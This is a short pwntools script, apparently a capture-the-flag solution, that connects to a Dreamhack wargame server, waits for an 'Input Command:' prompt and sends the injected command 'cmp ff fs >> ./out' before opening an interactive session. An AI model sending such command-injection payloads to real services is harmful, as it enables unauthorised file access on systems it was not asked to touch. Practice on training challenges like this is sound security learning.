from pwn import *

r = remote('host3.dreamhack.games', 14187)

RESULT = r.recvuntil(b'Input Command: \n')

print(str(RESULT, 'utf-8'))

PAYLOAD = b"cmp ff fs >> ./out"

print(PAYLOAD)

r.sendline(PAYLOAD)

r.interactive()